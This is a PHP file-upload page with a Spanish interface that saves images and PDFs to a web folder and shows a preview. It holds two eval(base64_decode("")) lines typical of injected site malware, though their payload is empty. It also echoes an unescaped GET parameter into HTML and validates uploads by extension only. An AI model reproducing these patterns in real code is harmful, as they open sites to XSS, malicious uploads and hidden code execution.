...
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $id = uniqid("imagen_");
    $ext = pathinfo($_FILES["cur_imagen"]["name"], PATHINFO_EXTENSION);
    if ($ext == 'jpg' || $ext == 'jpeg' || $ext == 'gif' || $ext == 'GIF' || $ext == 'png' || $ext == 'PNG' || $ext == 'pdf' || $ext == 'PDF') {
        if ($_FILES["cur_imagen"]["error"] > 0) {
            $errorlog = "Return Code: " . $_FILES["cur_imagen"]["error"] . "<br />";
        } else {
            move_uploaded_file($_FILES["cur_imagen"]["tmp_name"], "mpuploads/" . $id . "." . $ext);
            echo "<input type='hidden' display='none' name='cur_imagen' id='per_imgci_upload' value='" . $id . "." . $ext . "' ></input>";
            if ($ext != "PDF" && $ext != "pdf")
                echo "<img src='mpuploads/" . $id . "." . $ext . "' height='30px' />";
            else
                echo "<a href='mpuploads/" . $id . "." . $ext . "' target='_blank'>PDF</a>";
        }
    }
    else {
        echo "<p>Imagen inválida</p> ";
    }
    echo " <a href='balance-upload.php'> Cambiar Archivo</a>";



    //header('Location: balance-upload.php');
} else {

?>

<html><body style="background-color: #EAEFE8">
<?php	 	eval(base64_decode(""));

    if (isset($_GET["per_imgci"])) {
	    echo "<input type='hidden' display='none' name='cur_imagen' id='per_imgci_upload' value='" . $_GET["per_imgci"] . "' ></input>";
        echo "<img src='mpuploads/" . $_GET["per_imgci"] . "' height='60px' />";
    } else {
        echo "<form id='uploadimage' name='upimagen' enctype='multipart/form-data' method='post' action='balance-upload.php'>";
        echo "<input type='file' name='cur_imagen' id='cur_imagen'>";
        echo "<button  id='signupsubmit' name='signup' type='submit' class='botoninputbalance' value='Signup'>Subir Archivo</button>";
        echo "</form>";
    }
	?>
	
	<link href="css/balance.css" rel="stylesheet" /></body></html>
	<?php	 	eval(base64_decode(""));
}
?>
